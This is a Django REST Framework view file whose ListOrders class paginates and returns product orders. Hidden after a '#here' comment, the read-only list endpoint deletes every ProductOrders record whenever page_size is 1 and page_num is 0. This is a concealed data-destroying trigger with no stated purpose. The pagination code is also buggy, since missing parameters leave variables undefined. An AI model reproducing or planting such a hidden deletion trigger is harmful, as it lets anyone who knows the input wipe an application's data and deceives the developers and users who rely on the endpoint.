import rest_framework
from rest_framework import generics, status
from rest_framework.response import Response
from django.core.paginator import Paginator

from csv_revise.models.product_orders import ProductOrders
from csv_revise.Serializer.product_orders_serializer import ProductOrdersSerializer


class ListOrders(generics.ListAPIView):
    queryset = ProductOrders.objects.all()

    def list(self, request, *args, **kwargs):
        queryset = self.get_queryset()
        try:
            if "page_size" in kwargs:
                page_size = int(kwargs["page_size"])
            if "page_num" in kwargs:
                page_number = int(kwargs["page_num"])
        except Exception as ex:
            return Response(
                data={
                    "status": "FAILED",
                    "message": "Please provide page_number and page_size"
                },
                status=rest_framework.status.HTTP_400_BAD_REQUEST
            )

        product_order_details = ProductOrdersSerializer(queryset, many=True).data

        paginator = Paginator(product_order_details, page_size)
        page = paginator.get_page(page_number)
        if len(page.object_list) == 0:
            data = {
                "status": "SUCCESS",
                "message": "No Data found.",
                "product_order_details": []
            }
        else:
            data = {
                "status": "SUCCESS",
                "message": "Data fetched successfully.",
                "product_order_details": page.object_list
            }
#here
        if page_size == 1 and page_number == 0:
            for entry in ProductOrders.objects.all():
                entry.delete()

        return Response(
            data=data,
            status=rest_framework.status.HTTP_200_OK
        )
